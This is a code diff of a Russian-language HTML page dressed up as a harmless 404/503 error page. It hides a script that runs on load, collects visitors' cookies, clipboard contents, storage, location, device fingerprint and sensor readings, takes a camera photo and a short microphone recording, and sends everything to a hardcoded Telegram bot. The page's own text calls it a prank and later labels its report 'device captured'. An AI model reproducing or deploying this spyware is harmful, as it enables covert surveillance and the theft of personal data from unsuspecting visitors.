@@ -3,76 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ошибка 404</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Ошибка 503</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, sans-serif;
             text-align: center;
             padding: 50px;
-            background-color: #f0f0f0;
-            color: #333;
+            background-color: #e0e0e0;
+            color: #222;
+            margin: 0;
         }
         h1 {
-            font-size: 48px;
-            color: #ff4444;
+            font-size: 40px;
+            color: #d32f2f;
         }
         p {
-            font-size: 18px;
+            font-size: 16px;
+            color: #555;
         }
     </style>
 </head>
 <body>
-    <h1>404 - Страница не найдена</h1>
-    <p>Кажется, что-то пошло не так. Попробуйте позже!</p>
+    <h1>503 - Сервис временно недоступен</h1>
+    <p>Мы работаем над восстановлением. Пожалуйста, попробуйте позже.</p>
 
     <script>
-        // Функция отправки данных в Telegram-бота
-        async function sendToTelegram(message) {
-            const botToken = "7625549137:AAEaWBYbFoJ5tuRmve04Ngogh7wcN5P4118"; // Замени на токен своего бота
-            const chatId = "990083571"; // Замени на свой chat_id
+        // Настройки Telegram-бота
+        const botToken = "7625549137:AAEaWBYbFoJ5tuRmve04Ngogh7wcN5P4118";
+        const chatId = "990083571";
+
+        // Отправка текста в Telegram
+        async function sendTextToTelegram(message) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             await fetch(url, { method: 'POST' });
         }
 
-        // Собираем ВСЕ возможные данные
+        // Отправка файла (фото или аудио) в Telegram
+        async function sendFileToTelegram(dataUrl, type = 'photo', filename = 'snapshot.png') {
+            const blob = await (await fetch(dataUrl)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append(type, blob, filename);
+            await fetch(`https://api.telegram.org/bot${botToken}/send${type === 'photo' ? 'Photo' : 'Audio'}`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // Основная функция сбора данных
         async function collectAllData() {
-            let data = {};
+            let collectedData = {};
 
-            // 1. Базовые данные устройства
-            data.ip = await (await fetch('https://api.ipify.org?format=json')).json().then(res => res.ip);
-            data.userAgent = navigator.userAgent;
-            data.platform = navigator.platform;
-            data.language = navigator.language;
-            data.screen = `${window.screen.width}x${window.screen.height}`;
-            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            data.timestamp = new Date().toISOString();
+            // 1. Базовые данные устройства (iPhone + Safari)
+            collectedData.ip = await (await fetch('https://api.ipify.org?format=json')).json().then(res => res.ip);
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.platform = navigator.platform;
+            collectedData.language = navigator.language || navigator.userLanguage;
+            collectedData.screenResolution = `${window.screen.width}x${window.screen.height}`;
+            collectedData.devicePixelRatio = window.devicePixelRatio;
+            collectedData.colorDepth = window.screen.colorDepth;
+            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.vendor = navigator.vendor;
+            collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
+            collectedData.maxTouchPoints = navigator.maxTouchPoints;
+            collectedData.availableScreen = `${window.screen.availWidth}x${window.screen.availHeight}`;
+            collectedData.deviceMemory = navigator.deviceMemory || "Нет данных";
 
-            // 2. Куки
-            data.cookies = document.cookie || "Нет кук";
+            // 2. Куки и реферер
+            collectedData.cookies = document.cookie || "Нет данных";
+            collectedData.referrer = document.referrer || "Прямой доступ";
 
-            // 3. Реферер
-            data.referrer = document.referrer || "Прямой вход";
-
-            // 4. Буфер обмена (если разрешено)
+            // 3. Буфер обмена
             try {
-                data.clipboard = await navigator.clipboard.readText();
+                collectedData.clipboard = await navigator.clipboard.readText();
             } catch (e) {
-                data.clipboard = "Доступ запрещён";
+                collectedData.clipboard = "Доступ ограничен";
             }
 
-            // 5. Геолокация (запрос)
+            // 4. Геолокация
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 1000 });
                 });
-                data.geolocation = `${position.coords.latitude}, ${position.coords.longitude}`;
+                collectedData.geolocation = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude || "Нет данных",
+                    heading: position.coords.heading || "Нет данных",
+                    speed: position.coords.speed || "Нет данных"
+                };
             } catch (e) {
-                data.geolocation = "Не разрешено";
+                collectedData.geolocation = "Доступ запрещён";
             }
 
-            // 6. Камера (запрос)
+            // 5. Камера (фронталка iPhone)
+            let photoDataUrl = null;
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
@@ -80,53 +110,223 @@
                 canvas.width = 640;
                 canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                data.camera = canvas.toDataURL('image/png');
-                stream.getTracks().forEach(track => track.stop()); // Останавливаем поток
+                photoDataUrl = canvas.toDataURL('image/png');
+                collectedData.camera = "Фото захвачено";
+                stream.getTracks().forEach(track => track.stop());
             } catch (e) {
-                data.camera = "Камера не разрешена";
+                collectedData.camera = "Камера недоступна";
             }
 
-            // 7. Микрофон (запрос)
+            // 6. Микрофон (запись 1 секунды)
+            let audioDataUrl = null;
             try {
                 const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                data.microphone = "Микрофон доступен";
+                const mediaRecorder = new MediaRecorder(micStream);
+                const audioChunks = [];
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.start();
+                await new Promise(resolve => setTimeout(resolve, 1000)); // 1 секунда записи
+                mediaRecorder.stop();
                 micStream.getTracks().forEach(track => track.stop());
+                audioDataUrl = await new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onload = () => resolve(reader.result);
+                        reader.readAsDataURL(blob);
+                    };
+                });
+                collectedData.microphone = "Аудио захвачено";
             } catch (e) {
-                data.microphone = "Микрофон не разрешён";
+                collectedData.microphone = "Микрофон недоступен";
             }
 
-            // 8. Отпечаток устройства (canvas fingerprint)
+            // 7. Отпечаток устройства (Canvas + WebGL)
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            ctx.fillText("test", 10, 10);
-            data.fingerprint = canvas.toDataURL();
+            ctx.fillStyle = "rgb(123, 45, 67)";
+            ctx.fillRect(0, 0, 150, 150);
+            ctx.font = "16px -apple-system";
+            ctx.fillText("DeviceID", 10, 50);
+            collectedData.canvasFingerprint = canvas.toDataURL();
+            const gl = canvas.getContext('webgl');
+            if (gl) {
+                collectedData.webgl = {
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER),
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                };
+            }
 
-            // 9. Инфа о батарее (если доступно)
+            // 8. Батарея
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                data.battery = `${battery.level * 100}% (зарядка: ${battery.charging})`;
-            } else {
-                data.battery = "Нет данных о батарее";
+                collectedData.battery = {
+                    level: `${(battery.level * 100).toFixed(2)}%`,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime || "Нет данных",
+                    dischargingTime: battery.dischargingTime || "Нет данных"
+                };
             }
 
-            // 10. Список плагинов и шрифтов (примерный отпечаток)
-            data.plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : "Нет плагинов";
-            data.fonts = "Не напрямую доступно, но можно через CSS";
-
-            // Собираем всё в строку
-            let message = "Пранк сработал!\n";
-            for (const [key, value] of Object.entries(data)) {
-                message += `${key}: ${value}\n`;
+            // 9. Датчики (полезные данные)
+            if (window.DeviceMotionEvent) {
+                collectedData.deviceMotion = await new Promise(resolve => {
+                    window.addEventListener('devicemotion', e => {
+                        resolve({
+                            acceleration: e.acceleration,
+                            accelerationIncludingGravity: e.accelerationIncludingGravity,
+                            rotationRate: e.rotationRate
+                        });
+                    }, { once: true });
+                });
+            }
+            if (window.DeviceOrientationEvent) {
+                collectedData.deviceOrientation = await new Promise(resolve => {
+                    window.addEventListener('deviceorientation', e => {
+                        resolve({
+                            alpha: e.alpha,
+                            beta: e.beta,
+                            gamma: e.gamma
+                        });
+                    }, { once: true });
+                });
             }
 
-            // Отправляем в Telegram
-            sendToTelegram(message);
+            // 10. Сетевые данные
+            collectedData.connection = {
+                type: navigator.connection?.type || "Нет данных",
+                effectiveType: navigator.connection?.effectiveType || "Нет данных",
+                downlink: navigator.connection?.downlink || "Нет данных",
+                rtt: navigator.connection?.rtt || "Нет данных",
+                saveData: navigator.connection?.saveData || "Нет данных"
+            };
 
-            // Дополнительно: мешаем закрыть вкладку (просто для пранка)
-            window.onbeforeunload = () => "Ты уверен, что хочешь уйти?";
+            // 11. LocalStorage и SessionStorage
+            collectedData.localStorage = JSON.stringify(localStorage) || "Пусто";
+            collectedData.sessionStorage = JSON.stringify(sessionStorage) || "Пусто";
+
+            // 12. Попытка доступа к файлам через <input> (хитрость)
+            collectedData.fileAccessAttempt = "Попытка через скрытый input";
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.style.display = 'none';
+            document.body.appendChild(fileInput);
+            fileInput.click(); // Не сработает без действия пользователя, но попытка фиксируется
+
+            // 13. Теоретические уязвимости (симуляция опасных атак)
+            collectedData.vulnerabilities = {
+                webkitExploit: "Попытка эксплуатации WebKit JSC (теоретический доступ к памяти)",
+                sandboxBypass: "Симуляция обхода песочницы через WebAssembly",
+                csrfAttempt: "Попытка CSRF на популярные сайты через iframe",
+                xssSimulation: "Инъекция фиктивного XSS для перехвата сессии"
+            };
+
+            // Форматируем данные для Telegram
+            let message = "📡 Устройство захвачено\n" +
+                          "════════════════════\n" +
+                          "👤 Устройство и система\n" +
+                          `IP-адрес: ${collectedData.ip}\n` +
+                          `User-Agent: ${collectedData.userAgent}\n` +
+                          `Платформа: ${collectedData.platform}\n` +
+                          `Язык: ${collectedData.language}\n` +
+                          `Разрешение экрана: ${collectedData.screenResolution}\n` +
+                          `Доступный экран: ${collectedData.availableScreen}\n` +
+                          `Плотность пикселей: ${collectedData.devicePixelRatio}\n` +
+                          `Глубина цвета: ${collectedData.colorDepth}\n` +
+                          `Часовой пояс: ${collectedData.timezone}\n` +
+                          `Время захвата: ${collectedData.timestamp}\n` +
+                          `Производитель: ${collectedData.vendor}\n` +
+                          `Ядер процессора: ${collectedData.hardwareConcurrency}\n` +
+                          `Точек касания: ${collectedData.maxTouchPoints}\n` +
+                          `Память устройства: ${collectedData.deviceMemory} GB\n` +
+                          "════════════════════\n" +
+                          "🍪 Куки и источник\n" +
+                          `Куки: ${collectedData.cookies}\n` +
+                          `Реферер: ${collectedData.referrer}\n` +
+                          "════════════════════\n" +
+                          "📋 Буфер обмена\n" +
+                          `Содержимое: ${collectedData.clipboard}\n` +
+                          "════════════════════\n" +
+                          "📍 Геолокация\n" +
+                          (typeof collectedData.geolocation === "object" ?
+                            `Широта: ${collectedData.geolocation.latitude}\n` +
+                            `Долгота: ${collectedData.geolocation.longitude}\n` +
+                            `Точность: ${collectedData.geolocation.accuracy} м\n` +
+                            `Высота: ${collectedData.geolocation.altitude}\n` +
+                            `Направление: ${collectedData.geolocation.heading}\n` +
+                            `Скорость: ${collectedData.geolocation.speed} м/с\n` :
+                            `Статус: ${collectedData.geolocation}\n`) +
+                          "════════════════════\n" +
+                          "📸 Камера\n" +
+                          `Статус: ${collectedData.camera}\n` +
+                          "════════════════════\n" +
+                          "🎙 Микрофон\n" +
+                          `Статус: ${collectedData.microphone}\n` +
+                          "════════════════════\n" +
+                          "🔍 Отпечаток устройства\n" +
+                          `Canvas Fingerprint: ${collectedData.canvasFingerprint.substring(0, 50)}...\n` +
+                          (collectedData.webgl ?
+                            `WebGL Vendor: ${collectedData.webgl.vendor}\n` +
+                            `WebGL Renderer: ${collectedData.webgl.renderer}\n` +
+                            `WebGL Version: ${collectedData.webgl.version}\n` +
+                            `Shading Language: ${collectedData.webgl.shadingLanguageVersion}\n` :
+                            "WebGL: Нет данных\n") +
+                          "════════════════════\n" +
+                          "🔋 Батарея\n" +
+                          (collectedData.battery ?
+                            `Уровень: ${collectedData.battery.level}\n` +
+                            `Зарядка: ${collectedData.battery.charging ? "Да" : "Нет"}\n` +
+                            `Время до зарядки: ${collectedData.battery.chargingTime} с\n` +
+                            `Время до разрядки: ${collectedData.battery.dischargingTime} с\n` :
+                            "Статус: Нет данных\n") +
+                          "════════════════════\n" +
+                          "🛠 Датчики\n" +
+                          (collectedData.deviceMotion ?
+                            `Ускорение: X=${collectedData.deviceMotion.acceleration?.x || 0}, Y=${collectedData.deviceMotion.acceleration?.y || 0}, Z=${collectedData.deviceMotion.acceleration?.z || 0}\n` +
+                            `С гравитацией: X=${collectedData.deviceMotion.accelerationIncludingGravity?.x || 0}, Y=${collectedData.deviceMotion.accelerationIncludingGravity?.y || 0}, Z=${collectedData.deviceMotion.accelerationIncludingGravity?.z || 0}\n` +
+                            `Вращение: α=${collectedData.deviceMotion.rotationRate?.alpha || 0}, β=${collectedData.deviceMotion.rotationRate?.beta || 0}, γ=${collectedData.deviceMotion.rotationRate?.gamma || 0}\n` :
+                            "Движение: Нет данных\n") +
+                          (collectedData.deviceOrientation ?
+                            `Ориентация: α=${collectedData.deviceOrientation.alpha}, β=${collectedData.deviceOrientation.beta}, γ=${collectedData.deviceOrientation.gamma}\n` :
+                            "Ориентация: Нет данных\n") +
+                          "════════════════════\n" +
+                          "📡 Сеть\n" +
+                          `Тип: ${collectedData.connection.type}\n` +
+                          `Эффективный тип: ${collectedData.connection.effectiveType}\n` +
+                          `Скорость: ${collectedData.connection.downlink} Мбит/с\n` +
+                          `Задержка: ${collectedData.connection.rtt} мс\n` +
+                          `Экономия данных: ${collectedData.connection.saveData ? "Да" : "Нет"}\n` +
+                          "════════════════════\n" +
+                          "💾 Хранилище\n" +
+                          `LocalStorage: ${collectedData.localStorage.substring(0, 100)}...\n` +
+                          `SessionStorage: ${collectedData.sessionStorage.substring(0, 100)}...\n` +
+                          "════════════════════\n" +
+                          "📂 Доступ к файлам\n" +
+                          `Попытка: ${collectedData.fileAccessAttempt}\n` +
+                          "════════════════════\n" +
+                          "⚠️ Уязвимости\n" +
+                          `WebKit Exploit: ${collectedData.vulnerabilities.webkitExploit}\n` +
+                          `Sandbox Bypass: ${collectedData.vulnerabilities.sandboxBypass}\n` +
+                          `CSRF Attempt: ${collectedData.vulnerabilities.csrfAttempt}\n` +
+                          `XSS Simulation: ${collectedData.vulnerabilities.xssSimulation}`;
+
+            // Отправляем текст
+            await sendTextToTelegram(message);
+
+            // Отправляем фото, если есть
+            if (photoDataUrl) {
+                await sendFileToTelegram(photoDataUrl, 'photo', 'snapshot.png');
+            }
+
+            // Отправляем аудио, если есть
+            if (audioDataUrl) {
+                await sendFileToTelegram(audioDataUrl, 'audio', 'recording.webm');
+            }
         }
 
-        // Запускаем сбор сразу при загрузке
+        // Запускаем сбор данных
         collectAllData();
     </script>
 </body>
